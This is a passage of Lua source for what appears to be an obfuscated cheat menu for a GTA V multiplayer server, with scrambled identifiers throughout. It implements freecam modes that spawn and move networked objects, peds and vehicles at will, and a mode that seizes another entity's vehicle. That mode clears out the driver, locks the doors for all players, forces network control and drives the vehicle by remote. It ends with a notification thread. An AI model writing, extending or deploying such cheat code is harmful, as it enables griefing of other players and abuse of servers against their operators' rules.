                                    jrnyLearIyzKiSIen.config.SlaveStore.objtype = (jrnyLearIyzKiSIen.config.SlaveStore.objtype + 1) % 3
                                end

                                if jrnyLearIyzKiSIen.config.SlaveStore.objtype == 0 then
                                    jrnyLearIyzKiSIen.func.DrawSomeText("SMALL", 4, false, (sx / 2) + 60, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                    jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 45, sy - 45,163,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys["E"]) then
                                        jrnyLearIyzKiSIen.config.SlaveStore.objsel = (jrnyLearIyzKiSIen.config.SlaveStore.objsel + 1) % #jrnyLearIyzKiSIen.config.SlaveStore.propsmall
                                        jrnyLearIyzKiSIen.config.SlaveStore.objh = jrnyLearIyzKiSIen.config.SlaveStore.propsmall[jrnyLearIyzKiSIen.config.SlaveStore.objsel + 1]
                                    end
                                elseif jrnyLearIyzKiSIen.config.SlaveStore.objtype == 1 then
                                    jrnyLearIyzKiSIen.func.DrawSomeText("LARGE", 4, false, (sx / 2) + 60, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                    jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 45, sy - 45,163,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys["E"]) then
                                        jrnyLearIyzKiSIen.config.SlaveStore.objsel1 = (jrnyLearIyzKiSIen.config.SlaveStore.objsel1 + 1) % #jrnyLearIyzKiSIen.config.SlaveStore.proplarge
                                        jrnyLearIyzKiSIen.config.SlaveStore.objh = jrnyLearIyzKiSIen.config.SlaveStore.proplarge[jrnyLearIyzKiSIen.config.SlaveStore.objsel1 + 1]
                                    end
                                elseif jrnyLearIyzKiSIen.config.SlaveStore.objtype == 2 then
                                    jrnyLearIyzKiSIen.func.DrawSomeText("CUSTOM", 4, false, (sx / 2) + 60, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                    jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 45, sy - 45,172,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys["R"]) then
                                        local model = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('model', '', 25)
                                        if nlFXKkFxuKQAk.natives.IsModelValid(model) then
                                            RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(jrnyLearIyzKiSIen.config.SlaveStore.propcustom, RfPsUKHSFWJuBEJuz.rE.LumHash(model))
                                        else
                                            RfPsUKHSFWJuBEJuz.rE.pront('bad model man')
                                        end
                                    end
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys["E"]) then
                                        jrnyLearIyzKiSIen.config.SlaveStore.objsel2 = (jrnyLearIyzKiSIen.config.SlaveStore.objsel2 + 1) % #jrnyLearIyzKiSIen.config.SlaveStore.propcustom
                                        jrnyLearIyzKiSIen.config.SlaveStore.objh = jrnyLearIyzKiSIen.config.SlaveStore.propcustom[jrnyLearIyzKiSIen.config.SlaveStore.objsel2 + 1]
                                    end
                                end

                                if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N6']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot = (jrnyLearIyzKiSIen.config.SlaveStore.rot + 1.5) % 360.0
                                elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N4']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot = (jrnyLearIyzKiSIen.config.SlaveStore.rot - 1.5) % 360.0
                                end

                                if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N8']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot1 = (jrnyLearIyzKiSIen.config.SlaveStore.rot1 + 1.5) % 360.0
                                elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N5']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot1 = (jrnyLearIyzKiSIen.config.SlaveStore.rot1 - 1.5) % 360.0
                                end

                                if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N7']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot2 = (jrnyLearIyzKiSIen.config.SlaveStore.rot2 + 1.5) % 360.0
                                elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N9']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot2 = (jrnyLearIyzKiSIen.config.SlaveStore.rot2 - 1.5) % 360.0
                                end

                                if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys['N+']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot = 0
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot1 = 0
                                    jrnyLearIyzKiSIen.config.SlaveStore.rot2 = 0
                                end

                                if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                                    jrnyLearIyzKiSIen.config.SlaveStore.placeski = true
                                end

                                DmSgpcIoUEJtyTfBBt.FunFunc.FCObjectSpoon(coords.x, coords.y, coords.z, jrnyLearIyzKiSIen.config.SlaveStore.rot, jrnyLearIyzKiSIen.config.SlaveStore.rot1, jrnyLearIyzKiSIen.config.SlaveStore.rot2, jrnyLearIyzKiSIen.config.SlaveStore.placeski, jrnyLearIyzKiSIen.config.SlaveStore.objh)
                            else
                                nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(jrnyLearIyzKiSIen.config.SlaveStore.propski)						
                                nlFXKkFxuKQAk.natives.DeleteEntity(jrnyLearIyzKiSIen.config.SlaveStore.propski)
                                nlFXKkFxuKQAk.natives.DeleteObject(jrnyLearIyzKiSIen.config.SlaveStore.propski)
                                jrnyLearIyzKiSIen.config.SlaveStore.propski = nil
                            end
                            if jrnyLearIyzKiSIen.config.freecammode == 8 then
                                if hit and AimClickOnThing2 then
                                    if jrnyLearIyzKiSIen.config.Moverino.StoreDaDing == nil then
                                        jrnyLearIyzKiSIen.config.Moverino.StoreDaDing = entity
                                        local c = nlFXKkFxuKQAk.natives.GetEntityRotation(entity, 2)
                                        local v, b, n = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(c)
                                        jrnyLearIyzKiSIen.config.Moverino.rot = v
                                        jrnyLearIyzKiSIen.config.Moverino.rot1 = b
                                        jrnyLearIyzKiSIen.config.Moverino.rot2 = n
                                    else
                                        if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N6']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot = (jrnyLearIyzKiSIen.config.Moverino.rot + 1.5) % 360.0
                                        elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N4']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot = (jrnyLearIyzKiSIen.config.Moverino.rot - 1.5) % 360.0
                                        end
        
                                        if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N8']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot1 = (jrnyLearIyzKiSIen.config.Moverino.rot1 + 1.5) % 360.0
                                        elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N5']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot1 = (jrnyLearIyzKiSIen.config.Moverino.rot1 - 1.5) % 360.0
                                        end
        
                                        if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N7']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot2 = (jrnyLearIyzKiSIen.config.Moverino.rot2 + 1.5) % 360.0
                                        elseif nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, RfPsUKHSFWJuBEJuz.Keys['N9']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot2 = (jrnyLearIyzKiSIen.config.Moverino.rot2 - 1.5) % 360.0
                                        end
        
                                        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, RfPsUKHSFWJuBEJuz.Keys['N+']) then
                                            jrnyLearIyzKiSIen.config.Moverino.rot = 0
                                            jrnyLearIyzKiSIen.config.Moverino.rot1 = 0
                                            jrnyLearIyzKiSIen.config.Moverino.rot2 = 0
                                        end

                                        nlFXKkFxuKQAk.natives.SetEntityRotation(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, jrnyLearIyzKiSIen.config.Moverino.rot, jrnyLearIyzKiSIen.config.Moverino.rot1, jrnyLearIyzKiSIen.config.Moverino.rot2, 2, true)
                                        nlFXKkFxuKQAk.natives.SetEntityCoords(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, coords.x, coords.y, coords.z, false, false, false, false)
                                        nlFXKkFxuKQAk.natives.SetEntityCollision(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, false, false)
                                    end
                                end
                                if AimClickOnThing then
                                    nlFXKkFxuKQAk.natives.SetEntityCollision(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, true, true)
                                    jrnyLearIyzKiSIen.config.Moverino.StoreDaDing = nil
                                end
                            end
                            if jrnyLearIyzKiSIen.config.freecammode == 9 then
                                if hit and AimClickOnThing2 then
                                    if nlFXKkFxuKQAk.natives.IsEntityAPed(entity) or nlFXKkFxuKQAk.natives.IsEntityAVehicle(entity) or nlFXKkFxuKQAk.natives.IsEntityAnObject(entity) then
                                        if nlFXKkFxuKQAk.natives.IsModelValid(nlFXKkFxuKQAk.natives.GetEntityModel(entity)) then
                                            jrnyLearIyzKiSIen.config.Moverino.StoreDaDing = nlFXKkFxuKQAk.natives.GetEntityModel(entity)
                                        end
                                    end
                                end
                                if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE2']) then
                                    if jrnyLearIyzKiSIen.config.Moverino.StoreDaDing ~= nil then
                                        if nlFXKkFxuKQAk.natives.IsModelAVehicle(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing) then
                                            nlFXKkFxuKQAk.natives.CreateVehicle(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, coords.x, coords.y, coords.z, true, true, true)
                                        elseif nlFXKkFxuKQAk.natives.IsModelAPed(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing) then
                                            nlFXKkFxuKQAk.natives.CreatePed(0, jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, coords.x, coords.y, coords.z, true, true, true)
                                        else
                                            nlFXKkFxuKQAk.natives.CreateObject(jrnyLearIyzKiSIen.config.Moverino.StoreDaDing, coords.x, coords.y, coords.z, true, true, true)
                                        end
                                    end
                                end
                            end
                            if jrnyLearIyzKiSIen.config.freecammode == 10 then
                                if hit and AimClickOnThing then
                                    if nlFXKkFxuKQAk.natives.IsEntityAVehicle(entity) then
                                        if not nlFXKkFxuKQAk.natives.DoesEntityExist(jrnyLearIyzKiSIen.config.rctable.car) or not nlFXKkFxuKQAk.natives.DoesEntityExist(jrnyLearIyzKiSIen.config.rctable.rp) then
                                            jrnyLearIyzKiSIen.config.rctable.car = entity
                                            jrnyLearIyzKiSIen.config.rctable.ped1 = nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(jrnyLearIyzKiSIen.config.rctable.car, -1)
                                            nlFXKkFxuKQAk.natives.ClearPedTasksImmediately(jrnyLearIyzKiSIen.config.rctable.ped1)
                                            nlFXKkFxuKQAk.natives.SetVehicleDoorsLockedForAllPlayers(jrnyLearIyzKiSIen.config.rctable.car, true)
                                            nlFXKkFxuKQAk.natives.SetVehicleDoorsLocked(jrnyLearIyzKiSIen.config.rctable.car, 2)
                                            while not nlFXKkFxuKQAk.natives.NetworkHasControlOfEntity(jrnyLearIyzKiSIen.config.rctable.car) do
                                                nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(jrnyLearIyzKiSIen.config.rctable.car)
                                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                                            end
                                            local coord = nlFXKkFxuKQAk.natives.GetEntityCoords(jrnyLearIyzKiSIen.config.rctable.ped1, false)
                                            nlFXKkFxuKQAk.natives.TaskSmartFleeCoord(jrnyLearIyzKiSIen.config.rctable.ped1, coord.x, coord.y, coord.z, 1000, 1000, false, false)
                                            while not nlFXKkFxuKQAk.natives.HasModelLoaded(RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')) do
                                                nlFXKkFxuKQAk.natives.RequestModel(RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01'))
                                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                                            end
                                            while not nlFXKkFxuKQAk.natives.DoesEntityExist(jrnyLearIyzKiSIen.config.rctable.rp) do
                                                jrnyLearIyzKiSIen.config.rctable.rp = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(jrnyLearIyzKiSIen.config.rctable.car, 4, RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01'), -1, true, false)
                                                RfPsUKHSFWJuBEJuz.rE.LumWait(0) 
                                            end
                                        end
                                    end
                                end
                                if nlFXKkFxuKQAk.natives.DoesEntityExist(jrnyLearIyzKiSIen.config.rctable.car) and nlFXKkFxuKQAk.natives.DoesEntityExist(jrnyLearIyzKiSIen.config.rctable.rp) then
                                    nlFXKkFxuKQAk.natives.SetVehicleDoorsLockedForAllPlayers(jrnyLearIyzKiSIen.config.rctable.car, true)
                                    nlFXKkFxuKQAk.natives.SetVehicleDoorsLocked(jrnyLearIyzKiSIen.config.rctable.car, 2)
                                    nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(jrnyLearIyzKiSIen.config.rctable.rp, true)
                                    nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(jrnyLearIyzKiSIen.config.rctable.car)
                                    nlFXKkFxuKQAk.natives.SetVehicleEngineOn(jrnyLearIyzKiSIen.config.rctable.car, true)
                                    nlFXKkFxuKQAk.natives.SetPedAlertness(jrnyLearIyzKiSIen.config.rctable.rp, 0.0)
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) and not nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 9, 1)
                                    end
                                    
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, 172) or nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 6, 2500)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) and not nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 22, 1)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 174) and nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 13, 1)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 175) and nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 14, 1)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) and nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 30, 100)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 174) and nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 7, 1)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 175) and nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 8, 1)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 174) and not nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) and not nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 4, 1)
                                    end
                            
                                    if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 175) and not nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 172) and not nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 173) then
                                        nlFXKkFxuKQAk.natives.TaskVehicleTempAction(jrnyLearIyzKiSIen.config.rctable.rp, jrnyLearIyzKiSIen.config.rctable.car, 5, 1)
                                    end

                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, RfPsUKHSFWJuBEJuz.Keys['R']) then
                                        jrnyLearIyzKiSIen.config.rctable.camt = false
                                        local coord = nlFXKkFxuKQAk.natives.GetEntityCoords(jrnyLearIyzKiSIen.config.rctable.rp, false)
                                        nlFXKkFxuKQAk.natives.TaskSmartFleeCoord(jrnyLearIyzKiSIen.config.rctable.rp, coord.x, coord.y, coord.z, 1000, 10, false, false)
                                        jrnyLearIyzKiSIen.config.rctable.car = nil
                                        jrnyLearIyzKiSIen.config.rctable.ped1 = nil
                                        jrnyLearIyzKiSIen.config.rctable.rp = nil
                                    end

                                    if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, RfPsUKHSFWJuBEJuz.Keys['SPACE']) then
                                        jrnyLearIyzKiSIen.config.rctable.camt = not jrnyLearIyzKiSIen.config.rctable.camt
                                    end

                                    if jrnyLearIyzKiSIen.config.rctable.camt then
                                        if jrnyLearIyzKiSIen.config.rctable.cam == nil then
                                            nlFXKkFxuKQAk.natives.SetCamActive(jrnyLearIyzKiSIen.config.camf, false)
                                            local entv = nlFXKkFxuKQAk.natives.GetEntityCoords(jrnyLearIyzKiSIen.config.rctable.car, true)
                                            jrnyLearIyzKiSIen.config.rctable.cam = nlFXKkFxuKQAk.natives.CreateCamWithParams('DEFAULT_SCRIPTED_CAMERA', entv.x, entv.y, entv.z, 0.0, 0.0, 0.0, nlFXKkFxuKQAk.natives.GetGameplayCamFov(), false, 0)				
                                            nlFXKkFxuKQAk.natives.SetCamActive(jrnyLearIyzKiSIen.config.rctable.cam, true)
                                            nlFXKkFxuKQAk.natives.RenderScriptCams(true, false, 0, 0, 0)
                                        else
                                            local camcords = nlFXKkFxuKQAk.natives.GetEntityCoords(jrnyLearIyzKiSIen.config.rctable.car, false)
                                            local camrot = nlFXKkFxuKQAk.natives.GetEntityRotation(jrnyLearIyzKiSIen.config.rctable.car)
                                            local Markerloc = camcords + (jrnyLearIyzKiSIen.func.RotationToDirection(camrot) * -10)
                                            nlFXKkFxuKQAk.natives.SetCamCoord(jrnyLearIyzKiSIen.config.rctable.cam, Markerloc.x, Markerloc.y, camcords.z + 3)
                                            nlFXKkFxuKQAk.natives.SetCamRot(jrnyLearIyzKiSIen.config.rctable.cam, nlFXKkFxuKQAk.natives.GetEntityRotation(jrnyLearIyzKiSIen.config.rctable.car))
                                        end
                                    else
                                        jrnyLearIyzKiSIen.config.rctable.cam = nil
                                        nlFXKkFxuKQAk.natives.SetCamActive(jrnyLearIyzKiSIen.config.camf, true)
                                    end
                                end
                            end
                        end				 
                    end				
            end
        end
end)

-- Notification Thread --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.dienow do
        if jrnyLearIyzKiSIen.NotiQ.text[1] ~= nil then
            local spd = 1000
            for i = 1, #jrnyLearIyzKiSIen.NotiQ.text do
                spd = spd - 15
            end
            DmSgpcIoUEJtyTfBBt.Mfunc.DrawNotification(jrnyLearIyzKiSIen.NotiQ.text[1], spd)
            RfPsUKHSFWJuBEJuz.rE.LumWait(spd + jrnyLearIyzKiSIen.NotiQ.timeout[1])
            RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(jrnyLearIyzKiSIen.NotiQ.text, 1)
            RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(jrnyLearIyzKiSIen.NotiQ.timeout, 1)
        end
        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
    end
end)